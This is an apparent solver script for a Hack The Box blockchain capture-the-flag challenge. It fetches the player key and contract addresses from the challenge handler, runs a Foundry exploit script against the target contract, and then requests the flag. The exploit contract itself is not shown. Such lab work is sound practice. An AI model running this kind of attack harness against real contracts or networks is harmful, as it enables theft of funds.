#!/usr/bin/env python3

import subprocess
import json

from web3 import Web3
from eth_account import Account
from pwn import remote, context, args

context.log_level = "DEBUG"

if args.REMOTE:
    IP = args.HOST
    RPC_PORT = int(args.RPC_PORT)
    TCP_PORT = int(args.HANDLER_PORT)
    RPC_URL = f"http://{IP}:{RPC_PORT}/"
    HANDLER_URL = (IP, TCP_PORT)
else:
    RPC_URL = "http://localhost:8888/"
    HANDLER_URL = ("localhost", 8000)

def run_foundry_script(script: str, sig: str = None, args: list = None) -> None:
    cmd = ["forge", "script", script]
    if sig:
        cmd += ["--sig", sig]
    if args:
        cmd += args

    cmd += [
        "--rpc-url", RPC_URL,
        "--private-key", player_pvk,
        "-g", "130",
        "--revert-strings", "debug",
        "--broadcast",
        "--color", "always",
        "-vvvvvv",
    ]
    print(f"[*] {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    print(result.stdout)
    print(result.stderr)

if __name__ == "__main__":
    connection_info = {}
    handler_host, handler_port = HANDLER_URL
    
    ### connect to challenge handler and get connection info ##
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"1")
        data = p.recvall()

    lines = data.decode().split('\n')
    for line in lines:
        if line.startswith("[*]"):
            continue
        if line:
            key, value = line.split(': ')
            key = key.strip()
            value = value.strip()
            connection_info[key] = value

    player_pvk = connection_info['Player Private Key']
    setup_addr = connection_info['Setup contract']
    target_addr = connection_info['Target contract']
    player_account = Account.from_key(player_pvk)
    print(f"[+] Player Address: {player_account.address}")
    print(f"[+] Setup Contract Address: {setup_addr}")
    print(f"[+] Target Contract Address: {target_addr}")
    
    ### exploitation ###
    w3 = Web3(Web3.HTTPProvider(RPC_URL))
    assert w3.is_connected(), "Failed to connect to RPC"
    print(f"[*] Connected to RPC {RPC_URL}")
    
    run_foundry_script(
        "script/Exploit.s.sol:Exploit",
        sig="run(uint256,address)",
        args=[ str(int(player_pvk, 16)), target_addr ]
    )

    ### get flag ###
    with remote(handler_host, handler_port) as p:
        p.sendlineafter(b": ", b"3")
        flag = p.recvall().decode()
    if "HTB" in flag:
        print(f"\n\n[*] {flag}")
    
